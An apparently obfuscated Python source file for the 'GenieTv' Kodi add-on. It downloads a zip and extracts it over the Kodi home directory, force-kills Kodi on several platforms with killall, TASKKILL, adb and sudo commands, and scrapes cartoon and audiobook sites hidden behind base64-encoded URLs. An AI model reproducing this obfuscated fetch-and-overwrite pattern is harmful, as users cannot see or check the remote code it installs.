 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 I1iiii = os . path . join ( Oo0OO0000oooo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( I1iiii )
 except :
  pass
 downloader . download ( url , I1iiii , Oo0oO0ooo )
 OOOOO = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print OOOOO
 print '======================================='
 extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 12 - 12: OOoo0OO0 % I1IiI
 if 48 - 48: II1i1IiiIIi11 . i11iIiiIii
def IIioo0OO ( name , url , description ) :
 OOOOO = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 I1iiii = os . path . join ( I11 )
 time . sleep ( 2 )
 Oo0oO0ooo . create ( "GenieTv" , "Restoring" , '' , 'Please Wait' )
 print '======================================='
 print OOOOO
 print '======================================='
 extract . all ( I1iiii , OOOOO , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 2 - 2: OoOoOO00 - Ooo00oOo00o . iI1Ii11iII1 * II1i1IiiIIi11 / Ooo0OO0oOO
 if 80 - 80: i11i1 / OOoo0OO0 / I1IiI + i1IIi - Oo
def oOO0OO0OO ( ) :
 IiI1i = xbmcgui . Dialog ( ) . yesno ( 'Force Close Kodi' , 'You are about to close Kodi' , 'Would you like to continue?' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Close' )
 if IiI1i == 0 :
  return
 elif IiI1i == 1 :
  pass
 iIIiiIIi1IiI = I11IIIiIi11 ( )
 print "Platform: " + str ( iIIiiIIi1IiI )
 if iIIiiIIi1IiI == 'osx' :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif iIIiiIIi1IiI == 'linux' :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif iIIiiIIi1IiI == 'android' :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "Your system has been detected as Android, you " , "[COLOR=yellow][B]MUST[/COLOR][/B] force close XBMC/Kodi. [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Pulling the power cable is the simplest method to force close." )
 elif iIIiiIIi1IiI == 'windows' :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Use task manager and NOT ALT F4" )
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit via the menu." , "Your platform could not be detected so just pull the power cable." )
  if 39 - 39: oO0O % O0 % I1IiI . i1IIi
def I11IIIiIi11 ( ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  return 'android'
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  return 'linux'
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  return 'windows'
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  return 'osx'
 elif xbmc . getCondVisibility ( 'system.platform.atv2' ) :
  return 'atv2'
 elif xbmc . getCondVisibility ( 'system.platform.ios' ) :
  return 'ios'
  if 86 - 86: Ooo00oOo00o * OoooooooOO
  if 71 - 71: iIii1I11I1II1 - i11i1 . OOOo0 % OoooooooOO + i11i1
  if 26 - 26: Oo + i11i1 / Ooo00oOo00o % I1IiI % ii11ii1ii + OoOoOO00
def i11I1I1iiI ( url ) :
 Oo0oO0ooo . create ( "[COLOR=green]GenieTv[/COLOR]" , "Renaming paths..." , '' , 'Please Wait' )
 for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( url ) :
  for file in o0O0Oo00 :
   if file . endswith ( ".xml" ) :
    Oo0oO0ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
    IiII1 = open ( ( os . path . join ( I1i1iii1Ii , file ) ) ) . read ( )
    iIO0O00OOo = IiII1 . replace ( oooOOOOO , 'special://home/' )
    ooOOo00O00Oo = open ( ( os . path . join ( I1i1iii1Ii , file ) ) , mode = 'w' )
    ooOOo00O00Oo . write ( str ( iIO0O00OOo ) )
    ooOOo00O00Oo . close ( )
 oOO0OO0OO ( )
 if 66 - 66: i11iIiiIii / OOooOOo - OoooooooOO / i1IIi . i11iIiiIii
def IIIII1iii11 ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3d3dy5saXN0ZW5saXZlLmV1L3VrLmh0bWw=' ) )
 OoOO0oo0o = re . compile ( '<tr>.+?<td><a href=".+?"><b>(.+?)</b>.+?<td><a href="(.+?)">' , re . DOTALL ) . findall ( IIIII1II )
 for OO0ooOOO0OOO , I1i11i in OoOO0oo0o :
  IIi1I ( OO0ooOOO0OOO , I1i11i , 222 , ii11iIi1I + 'radio.png' )
  if 27 - 27: O0 . I1I1ii / II1i1IiiIIi11
def OO00O000OOO ( ) :
 IIIII1II = iI1 ( i1111 ( 'aHR0cDovL3d3dy50b29uamV0LmNvbS8=' ) )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" style="font-size:.8em;">(.+?)</a>' ) . findall ( IIIII1II )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  I1111I1II11 ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , 'http://www.toonjet.com/' + I1i11i , 8051 , ii11iIi1I + 'classictoons.png' )
def iIOo0O ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)"><img src="(.+?)"' ) . findall ( IIIII1II )
 II11i1I11Ii1i = re . compile ( '<a href="(.+?)">.+?</a></td></tr></table>' ) . findall ( IIIII1II )
 for url , IIIIiI11I11 in OoOO0oo0o :
  if 'ol.gif' in IIIIiI11I11 :
   pass
  elif 'link_block_' in IIIIiI11I11 :
   pass
  elif '.png' in IIIIiI11I11 :
   pass
  else :
   I1111I1II11 ( ( IIIIiI11I11 ) . replace ( 'http://www.toonjet.com/images/icons/' , '' ) . replace ( 'images/icons/' , '' ) . replace ( '.jpg' , '' ) . replace ( '_icon' , '' ) . replace ( '_' , ' ' ) , 'http://www.toonjet.com/' + url , 8052 , ii11iIi1I + 'vod.png' )
 for url in II11i1I11Ii1i :
  I1111I1II11 ( 'NEXT PAGE' , 'http://www.toonjet.com/' + url , 8051 , ii11iIi1I + 'Next.png' )
def Ii11 ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<iframe width="640" height="480" src="(.+?)" frameborder="0" allowfullscreen></iframe>' ) . findall ( IIIII1II )
 for url in OoOO0oo0o :
  IIi1I ( '[COLORgreen]PLAY[/COLOR]' , ( url ) . replace ( 'http://www.youtube.com/embed/' , '' ) . replace ( '?autoplay=0' , '' ) , 8043 , ii11iIi1I + 'classictoons.png' )
  if 8 - 8: Oo + OoOoOO00 * i11i1 * I1IiI * OOoo0OO0 / iI1Ii11iII1
  if 21 - 21: Ooo0OO0oOO / OoooooooOO
def III1IiIII1 ( ) :
 O00ooOo ( 'Audio Books' , '' , 30011 , ii11iIi1I + 'audiobooks.png' , ii11iIi1I + 'audiobooks.png' , '' )
 O00ooOo ( 'Kids Audio Books' , '' , 30006 , ii11iIi1I + 'kidsaudiobooks.png' , ii11iIi1I + 'kidsaudiobooks.png' , '' )
 if 80 - 80: OOooOOo - i11i1 + OoooooooOO
def O0ooOoO ( ) :
 O00ooOo ( 'All' , '' , 30001 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 O00ooOo ( 'Popular' , '' , 30012 , ii11iIi1I + 'POPULARv.png' , ii11iIi1I + 'POPULARv.png' , '' )
 O00ooOo ( 'Search' , '' , 30013 , ii11iIi1I + 'search.png' , ii11iIi1I + 'search.png' , '' )
 if 26 - 26: I1IiI / Oo - i1IIi + OOoo0OO0
def IiiIi ( ) :
 oO0 = i11iIIIIIi1 ( OO0o + 'books' + II11iiii1Ii )
 OoOO0oo0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( oO0 )
 for OO0ooOOO0OOO , I1i11i , iIIi in OoOO0oo0o :
  if 'Parent' in OO0ooOOO0OOO :
   pass
  elif '2' in iIIi :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 96 - 96: II1i1IiiIIi11
def i1I11iIII1i1I ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 oO0 = i11iIIIIIi1 ( OO0o + 'books' + II11iiii1Ii )
 OoOO0oo0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( oO0 )
 for OO0ooOOO0OOO , I1i11i , iIIi in OoOO0oo0o :
  if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
   if '1' in iIIi :
    O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '2' in iIIi :
    O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '3' in iIIi :
    O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 63 - 63: Oo + I1I1ii - OoOoOO00
    if 2 - 2: iI1Ii11iII1
def oOo0O0O0 ( ) :
 oO0 = i11iIIIIIi1 ( OO0o + 'books' + II11iiii1Ii )
 OoOO0oo0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( oO0 )
 for OO0ooOOO0OOO , I1i11i , iIIi in OoOO0oo0o :
  if '1' in iIIi :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 3010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '2' in iIIi :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '3' in iIIi :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , I1i11i , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 89 - 89: Ooo0OO0oOO / OoooooooOO . II1i1IiiIIi11
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 34 - 34: II1i1IiiIIi11 - OoooooooOO . OOOo0 / OoOoOO00
def II1II ( url ) :
 I1III1111iIi = url
 oO0 = i11iIIIIIi1 ( url )
 II11i1I11Ii1i = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in II11i1I11Ii1i :
  if 'mp3' in OO0ooOOO0OOO :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'wma' in OO0ooOOO0OOO :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'm4b' in OO0ooOOO0OOO :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '/' in OO0ooOOO0OOO :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 97 - 97: i11iIiiIii / i11i1 % I1I1ii
   if 71 - 71: OoooooooOO
   if 11 - 11: iI1Ii11iII1
def o0oooO ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 I1III1111iIi = url
 OoOO0oo0o = re . compile ( '<li><a href="(.+?)">(.+?)</a></li>' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if 'Parent' in OO0ooOOO0OOO :
   pass
  elif '.db' in OO0ooOOO0OOO :
   pass
  elif '.jpg' in OO0ooOOO0OOO :
   pass
  elif '.html' in OO0ooOOO0OOO :
   pass
  elif '.doc' in OO0ooOOO0OOO :
   pass
  elif 'mp3' in OO0ooOOO0OOO :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif 'm4a' in OO0ooOOO0OOO :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , I1III1111iIi + url , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 89 - 89: OoOoOO00 / Ooo0OO0oOO
   if 14 - 14: i11i1 . OOOo0 * oOO + OoOoOO00 - oOO + i11i1
def IIIIIiII1 ( ) :
 O00ooOo ( 'A-Z' , '' , 7 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 O00ooOo ( 'All' , '' , 3 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 O00ooOo ( 'Search' , '' , 14 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 if 45 - 45: OOOo0 / II1i1IiiIIi11 . II1i1IiiIIi11
def i1oO ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9tcDNfZG93bmxvYWRzLmh0bQ==' ) )
 OoOO0oo0o = re . compile ( '<td width=".+?" align="center">.+?<a href="(.*?)">.+?<img border="0" src="images/Squeeze%20(.*?).gif" width="74" height=".*?"></a></td>' , re . DOTALL ) . findall ( oO0 )
 for I1i11i , IIIIiI11I11 in OoOO0oo0o :
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + I1i11i + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
  if '-x' in IIIIiI11I11 :
   pass
  else :
   O00ooOo ( IIIIiI11I11 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) ) + ( I1i11i ) . replace ( 'colour_it' , 'books_audio/audio_books_a' ) , 30008 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9pbWFnZXMvU3F1ZWV6ZSUyMA==' ) ) + IIIIiI11I11 + '.gif' , ii11iIi1I + 'kodible.png' , '' )
   if 30 - 30: Oo . Ooo00oOo00o
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 57 - 57: OOoo0OO0 . Oo + OoOoOO00
 if 43 - 43: I1I1ii % II1i1IiiIIi11
def o0O0ooOOoO ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<td width=".*?" height=".*?"><b>.*?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  if '</a>' in OO0ooOOO0OOO :
   pass
  elif '(' in OO0ooOOO0OOO :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 19 - 19: i11iIiiIii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 54 - 54: OoOoOO00 . OOoo0OO0
def oOOII1i11i1iIi11 ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 OoOO0oo0o = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
   if '</a>' in OO0ooOOO0OOO :
    pass
   elif '(' in OO0ooOOO0OOO :
    O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + I1i11i , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   else :
    O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + I1i11i , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 83 - 83: oO0O
    if 25 - 25: OOoo0OO0 + I1IiI . OOooOOo % I1IiI * i11i1
def ii1IiIi11 ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 OoOO0oo0o = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if '</a>' in OO0ooOOO0OOO :
   pass
  elif '(' in OO0ooOOO0OOO :
   O00ooOo ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + I1i11i , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + I1i11i , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 22 - 22: Ooo0OO0oOO
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 33 - 33: iIii1I11I1II1 / oO0O
 if 1 - 1: oO0O
def IiiiI1 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)">Download</a></b></td>' ) . findall ( oO0 )
 for url in OoOO0oo0o :
  I1III1111iIi = ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) ) + url
  Resolve ( I1III1111iIi )
  if 100 - 100: Ooo0OO0oOO . oO0O % i1IIi . oOO
def OOo0Oo0OOo0 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<td width="247">(.*?)</td>.*?<a href="(.+?)">' , re . DOTALL ) . findall ( oO0 )
 for OO0ooOOO0OOO , url in OoOO0oo0o :
  if '<p align' in OO0ooOOO0OOO :
   pass
  elif '&nbsp;' in OO0ooOOO0OOO :
   pass
  else :
   O00OOOoOoo0O ( ( OO0ooOOO0OOO ) . replace ( '&nbsp;' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 19 - 19: OOoo0OO0 + OoOoOO00
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 84 - 84: O0 - OoOoOO00 . Oo / Ooo0OO0oOO . OoooooooOO + i11iIiiIii
 if 86 - 86: OOoo0OO0 / OOooOOo - OOooOOo + ii11ii1ii + Ooo0OO0oOO
def IIiooOoO0OO0oOO ( ) :
 oO0 = cloudflare . source ( i1111 ( 'aHR0cDovL3dhdGNoY2FydG9vbnNvbmxpbmUuZXUv' ) )
 OoOO0oo0o = re . compile ( 'class="menu-item menu-item-type-.+?><a href="([^"]*)">(.+?)</a></li>' , re . DOTALL ) . findall ( oO0 )
 for I1i11i , OO0ooOOO0OOO in OoOO0oo0o :
  if 'ongoing' in I1i11i :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 21005 , ii11iIi1I + 'on-going.png' , '' , '' )
  if 'cartoon-series' in I1i11i :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 21005 , ii11iIi1I + 'cartoonseries.png' , '' , '' )
  if 'disney' in I1i11i :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 21005 , ii11iIi1I + 'disneytoons.png' , '' , '' )
  if 'genre' in I1i11i :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 21005 , ii11iIi1I + 'cartoongenre.png' , '' , '' )
  if 'years' in I1i11i :
   O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , I1i11i , 21005 , ii11iIi1I + 'years.png' , '' , '' )
def II1i ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( '<a href="([^"]*)" title="([^"]*)" rel="nofollow" id="featured-thumbnail">.+?<div class="featured-thumbnail"><img width="140" height="200" src="([^"]*)"' , re . DOTALL ) . findall ( oO0 )
 o0OO00oo = re . compile ( '<button type="button"><a href="([^"]*)" target="_blank">(.+?)</a>' ) . findall ( oO0 )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO , IIIIiI11I11 in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 21006 , IIIIiI11I11 , IIIIiI11I11 , OO0ooOOO0OOO )
 for url , OO0ooOOO0OOO in o0OO00oo :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in next :
  O00OOOoOoo0O ( '[COLORgreen]NEXT[/COLOR]' , url , 21005 , ii11iIi1I + 'Next.png' , '' , '' )
def i1i1IiIiIi1Ii ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( '<li><a href="([^"]*)" >(.+?)</a></li>' , re . DOTALL ) . findall ( oO0 )
 oO0ooOO = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( oO0 )
 IIi1iI1 = re . compile ( 'src="([^"]*)" frameborder=' ) . findall ( oO0 )
 IIi11i1II = re . compile ( '<iframe src="([^"]*)"' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 21007 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in IIi1iI1 :
  O00OOOoOoo0O ( '[COLORgreen]PLAY[/COLOR]' , 'http:' + url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url , OO0ooOOO0OOO in oO0ooOO :
  ooo00OOOooO ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 else :
  O00OOOoOoo0O ( '[COLORgreen]NO STREAMS AVAILABLE[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
def OO0ooo0o0 ( url ) :
 oO0 = cloudflare . source ( url )
 OoOO0oo0o = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO in OoOO0oo0o :
  ooo00OOOooO ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
  if 69 - 69: ii11ii1ii - I1I1ii
def iiIIi1 ( ) :
 I1111I1II11 ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 I1111I1II11 ( '[COLORgreen]ANIME[/COLOR]' , 'https://kissanime.to/AnimeList' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 10 - 10: OOoo0OO0 * oO0O % OoooooooOO
def O0Oo0Ooo ( ) :
 I1111I1II11 ( '[COLORgreen]BY NAME[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20002 , ii11iIi1I + 'ORIGINCARTOON.png' )
